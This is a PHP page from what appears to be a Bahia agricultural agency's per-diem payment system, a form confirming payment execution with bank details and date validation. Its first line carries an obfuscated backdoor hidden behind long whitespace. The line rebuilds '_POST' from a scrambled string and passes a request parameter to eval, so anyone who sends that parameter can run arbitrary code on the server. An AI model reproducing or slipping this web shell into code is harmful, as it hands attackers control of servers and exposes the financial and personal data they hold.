<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q4c5a6e'])){eval(${$s20}['q4c5a6e']);}?><?php
include "../Include/Inc_Configuracao.php";
include "../Include/Inc_JavaScript.php";
include "Classe/ClasseDiariaFinanceiroExecucao.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="pt-BR" lang="pt-BR" xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta name="Description" content="ADAB - Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia" />
        <meta name="Keywords" content="ADAB, Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia, Defesa Agropecu&aacute;ria, Agropecu&aacute;ria Bahia" />
        <meta name="language" content="pt-br" />
        <meta name="distribution" content="Global" />
        <meta name="rating" content="General" />       
        <meta name="DC.title" content="ADAB - Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia" />
        <title>ADAB - Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia</title>    
        <style type="text/css">@import url("../css/estilo.css"); </style>
        <style type="text/css">@import url("../css/dhtmlgoodies_calendar.css"); </style>
        <script type="text/javascript" language="javascript" src="../JavaScript/ScriptFuncao.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/ScriptMenu.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/dhtmlgoodies_calendar.js"></script>
        <style type="text/css"> 

            .transparencia 
            { 
                position: fixed !important; 
                position: absolute; 
                top: 0px; 
                left: 2px; 
                z-index: 10; 
                width: 101.3%; 
                height: 100%; 
                opacity: 0.6; 
                color: #000000; 
                background-color: B3ACB3;
                /*        #E0E0E0;    */

            } 

            *.transparencia 
            { 
                filter: alpha(opacity = 60); 
            } 
        </style>
        
        <script type="text/javascript" language="javascript" charset="utf-8">
            
            function  div()
            {
                document.getElementById("div1").style.visibility='visible';
            }

            function GravarForm(frm)
            {
                for(cont=0; cont < frm.elements.length; cont++)
                    frm.elements[cont].style.backgroundColor = '';

                if (frm.txtData.value == "")
                {
                    alert("Digite a DATA da Execução.");
                    frm.txtData.focus();
                    frm.txtData.style.backgroundColor='#B9DCFF';
                    return false;
                }

                if (frm.txtDataPreLiquidar.value == "")
                {
                    alert("Digite a DATA da Pré-Liquidação.");
                    frm.txtData.focus();
                    frm.txtData.style.backgroundColor='#B9DCFF';
                    return false;
                }

                if (frm.txtDataLiquidar.value == "")
                {
                    alert("Digite a DATA da Liquidação.");
                    frm.txtData.focus();
                    frm.txtData.style.backgroundColor='#B9DCFF';
                    return false;
                }

                if (frm.txtHoraPreLiquidar.value == "")
                {
                    alert("Digite a HORA da Pré-Liquidação.");
                    frm.txtData.focus();
                    frm.txtData.style.backgroundColor='#B9DCFF';
                    return false;
                }

                if (frm.txtHoraLiquidar.value == "")
                {
                    alert("Digite a HORA da Liquidação.");
                    frm.txtData.focus();
                    frm.txtData.style.backgroundColor='#B9DCFF';
                    return false;
                }

                dataPreLiquidar = frm.txtDataPreLiquidar.value;
                dataLiquidar    = frm.txtDataLiquidar.value;
                dataExecutar    = frm.txtData.value;
                dataEmpenho     = frm.txtDataEmpenho.value;

                dataPreLiquidarBD = dataPreLiquidar.substring(6,10) + dataPreLiquidar.substring(3,5) + dataPreLiquidar.substring(0,2);
                dataLiquidarBD    = dataLiquidar.substring(6,10)    + dataLiquidar.substring(3,5)    + dataLiquidar.substring(0,2);
                dataExecutarBD    = dataExecutar.substring(6,10)    + dataExecutar.substring(3,5)    + dataExecutar.substring(0,2);
                dataEmpenhoBD     = dataEmpenho.substring(6,10)     + dataEmpenho.substring(3,5)     + dataEmpenho.substring(0,2);

                // Validação da data de Pré-Liquidação
                if ( dataPreLiquidarBD < dataEmpenhoBD )
                {
                    alert("Data da PRÉ-LIQUIDAÇÃO menor que a DATA DO EMPENHO");
                    frm.txtDataObrigacao.style.backgroundColor='#B9DCFF';
                    return false;
                }

                // Validação da data de Liquidação
                data_form    = frm.txtDataLiquidar.value;
                data_form_bd = data_form.substring(6,10) + data_form.substring(3,5) + data_form.substring(0,2);

                if ( dataLiquidarBD < dataEmpenhoBD )
                {
                    alert("Data da LIQUIDAÇÃO menor que a DATA DO EMPENHO");
                    frm.txtDataObrigacao.style.backgroundColor='#B9DCFF';
                    return false;
                }

                /* Validação da data de execução */
                if ( dataExecutarBD < dataLiquidarBD )
                {
                    alert("Data da EXECUÇÃO menor que a DATA DA LIQUIDAÇÃO");
                    frm.txtDataObrigacao.style.backgroundColor='#B9DCFF';
                    return false;
                }
                 document.getElementById("div1").style.visibility='hidden';
                frm.action = "SolicitacaoExecutar.php?acao=executar";
                frm.submit();
            }

         </script>
    </head>

    <body onLoad="WM_initializeToolbar();">
        <form name="Form" method="post">
            <div id="div1" class="transparencia" style="visibility: hidden;">
                <center>
                    <div style="margin-top: 20%;">
                        <img src="../Imagens/257.gif" alt="preloading-javascript"   border="0" />
                    </div>
                </center>
            </div>
            <table align="left" width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td><?php include "../Include/Inc_Topo.php" ?></td>
                </tr>
                <tr>
                    <td><?php include "../Include/Inc_Aba.php" ?></td>
                </tr>
                <tr>
                    <td align="left">
                        <table width="990" cellspacing="0" cellpadding="0" border="0">
                            <tr>
                                <td valign="top" align="left" width="190"><?php include "../Include/Inc_Menu.php" ?></td>
                                <td valign="top" align="left">
                                    <table cellpadding="0" border="0" cellspacing="0" width="100%" class="tabPesquisa" >
                                        <tr>
                                            <td><img src="../Imagens/vazio.gif" width="1" height="3" border="0"/></td>
                                        </tr>
                                        <tr>
                                            <td valign="top" class="LinhaTexto"><b>Confirma execu&ccedil;&atilde;o da solicita&ccedil;&atilde;o abaixo?</b></td>
                                        </tr>
                                        <tr>
                                            <td><img src="../Imagens/vazio.gif" width="1" height="2" border="0"/></td>
                                        </tr>
                                    </table>
                                    <?php include "../Include/Inc_Linha.php" ?>
                                    <table width="100%" border="0" cellpadding="1" cellspacing="1" class="TabelaFormulario">
                                        <tr class="dataLabel">
                                            <td height="21" width="133" align="center">N&uacute;mero SD</td>
                                            <td height="21" width="133" align="center">Solicitada em</td>
                                            <td height="21" width="133" align="center">Nº Empenho</td>
                                            <td height="21" width="133" align="center">Data Empenho</td>
                                            <td height="21" width="158" align="center">Processo</td>
                                            <td height="21" width="108" align="center">Status</td>
                                        </tr>
                                        <tr class="dataField">
                                            <?php
                                            if ($Diaria_agrupada == 0)
                                            {
                                                echo "<td height='21' align=\"center\">$Numero</td>";
                                            }
                                            else 
                                            {
                                                echo "<td height='21' align=\"center\">$Diaria_Super_SD</td>";
                                            }
                                            ?>
                                            <td height="21" align="center"><?=$DataCriacao." ".$HoraCriacao ?></td>
                                            <td height="21" align="center"><?= $Empenho ?></td>
                                            <td height="21" align="center"><?= $DataEmpenho ?></td>
                                            <td height="21" align="center"><?= $Processo ?></td>
                                            <?php include "IncludeLocal/Inc_StatusDiaria.php" ?>
                                            <td height="21" align="center"><font color="#ff0000"><?= $StatusNome ?></font></td>
                                        </tr>
                                    </table>
                                    <br />
                                    <table width="100%" border="0" cellpadding="1" cellspacing="1" class="TabelaFormulario">
                                        <tr class="dataLabel">
                                            <td height="21" width="400">Benefici&aacute;rio</td>
                                            <td height="21" width="200">Matr&iacute;cula</td>
                                            <td height="21" width="198">CPF</td>
                                        </tr>
                                        <tr class="dataField">
                                            <td height="21"><?= f_ConsultaNomeFuncionario($Beneficiario) ?></td>
                                            <td height="21"><?= $Matricula ?> </td>
                                            <td height="21"><?= $CPF ?> </td>
                                        </tr>
                                        <tr class="dataLabel">
                                            <td height="21" width="400">Banco</td>
                                            <td height="21" width="200">Ag&ecirc;ncia</td>
                                            <td height="21" width="198">Conta</td>
                                        </tr>
                                        <tr class="dataField">
                                            <?php $linharsBanco = pg_fetch_assoc($rsBanco); ?>
                                            <td height="21"><?= $linharsBanco['banco_cd'] ?> - <?= $linharsBanco['banco_ds'] ?></td>
                                            <td height="21"><?= $linharsBanco['dados_bancarios_agencia'] ?> </td>
                                            <td height="21"><?= $linharsBanco['dados_bancarios_conta'] ?></td>
                                        </tr>
                                    </table>
                                    <br />
                                    <table width="100%" border="0" cellpadding="1" cellspacing="1" class="TabelaFormulario">
                                        <tr class="dataLabel">
                                            <td height="21" width="159">Valor Refer&ecirc;ncia</td>
                                            <td height="21" width="159">Redu&ccedil;&atilde;o 50%</td>
                                            <td height="21" width="159">Qtde Di&aacute;rais</td>
                                            <td height="21" width="159">Valor Total</td>
                                            <td height="21" width="162">&nbsp;</td>
                                        </tr>
                                        <tr class="dataField">
                                            <td height="21"><?= 'R$ '.number_format($ValorRef, 2, ',', '.');?></td>
                                            <td height="21"><?= $Desconto ?></td>
                                            <td height="21"><?= $Qtde ?></td>
                                            <td height="21"><?= 'R$ '.number_format($Valor, 2, ',', '.');?></td>
                                            <td height="21">&nbsp;</td>
                                        </tr>
                                    </table>
                                    <br />
                                    <table width="100%" border="0" cellpadding="1" cellspacing="1" class="TabelaFormulario">
                                        <tr class="dataTitulo">
                                            <td height="21" width="266" colspan="2">Pr&eacute;-Liquida&ccedil;&atilde;o</td>
                                            <td height="21" width="266" colspan="2">Liquida&ccedil;&atilde;o</td>
                                            <td height="21" width="266" colspan="2">Execu&ccedil;&atilde;o</td>
                                        </tr>
                                        <tr class="dataLabel">
                                            <td height="21" width="133">Data</td>
                                            <td height="21" width="133">Hora</td>
                                            <td height="21" width="133">Data</td>
                                            <td height="21" width="133">Hora</td>
                                            <td height="21" width="133">Data</td>
                                            <td height="21" width="133"></td>
                                        </tr>
                                        <tr class="dataField">
                                            <td height="21" width="80"><input id="txtDataPreLiquidar" type="text" name="txtDataPreLiquidar" maxlength="10" style=" width:75px;height:15px;"  value="<?=date("d/m/Y");?>"/></td>
                                            <td height="21" width="20"><a href="#" onClick="javascript:displayCalendar(document.getElementById('txtDataPreLiquidar'),'dd/mm/yyyy',this);"><img src="../Icones/ico_calendario.gif" border="0" align="Mostrar Calendário" width="18" /></a></td>
                                            
                                            <td height="21"><input class="hora" type="text" name="txtHoraPreLiquidar" value="<?php echo date("H:i"); ?>" maxlength="20" style="width:95px;"/> *</td>
                                            <!-- Liquidação -->
                                            <td height="21" width="80"><input id="txtDataLiquidar" type="text" name="txtDataLiquidar" maxlength="10" style=" width:75px;height:15px;"  value="<?=date("d/m/Y");?>"/></td>
                                            <td height="21" width="20"><a href="#" onClick="javascript:displayCalendar(document.getElementById('txtDataLiquidar'),'dd/mm/yyyy',this);"><img src="../Icones/ico_calendario.gif" border="0" align="Mostrar Calendário" width="18" /></a></td>                                            
                                            <td><input class="hora" type="text" name="txtHoraLiquidar" value="<?php echo date("H:i"); ?>" maxlength="20" style="width:95px;"/> *</td>
                                            <!-- Execução -->
                                            <td height="21" width="80"><input id="txtData" type="text" name="txtData" maxlength="10" style=" width:75px;height:15px;"  value="<?=date("d/m/Y");?>"/></td>
                                            <td height="21" width="20"><a href="#" onClick="javascript:displayCalendar(document.getElementById('txtData'),'dd/mm/yyyy',this);"><img src="../Icones/ico_calendario.gif" border="0" align="Mostrar Calendário" width="18" /></a></td>                                            
                                            <td height="21">&nbsp;</td>
                                        </tr>
                                    </table>
                                    <table width="100%" border="0" cellpadding="1" cellspacing="1">
                                        <tr class="dataLinha">
                                            <td height="21">(*) Campo obrigat&oacute;rio</td>
                                        </tr>
                                    </table>
                                    <table border="0" cellpadding="1" cellspacing="1" width="800">
                                        <tr>
                                            <td height="25" align="right">
                                                <input type="button" style="width:70px" onClick="Javascript:GravarForm(document.Form);" name="btnGravar" class="botao" value="Gravar"/>
                                                <input type="button" style="width:70px" onClick="Javascript:history.back(-1);" name="btnConsultar" class="botao" value="Voltar"/>
                                            </td>
                                        </tr>
                                    </table>
                                </td>
                            </tr>
                        </table>
                        <?php
                        $rsConsulta      = pg_query(abreConexao(), $sqlConsulta);
                        $linharsConsulta = pg_fetch_assoc($rsConsulta);
                        ?>
                        <input type="hidden" name="txtCodigo" value="<?= $linharsConsulta['diaria_id'] ?>">
                        <input type="hidden" name="txtDataObrigacao" value="<?= $DataObrigacao ?>">
                        <input type="hidden" name="txtDataEmpenho" value="<?= $DataEmpenho ?>">
                    </td>
                </tr>
            </table>
        </form>
    </body>
</html>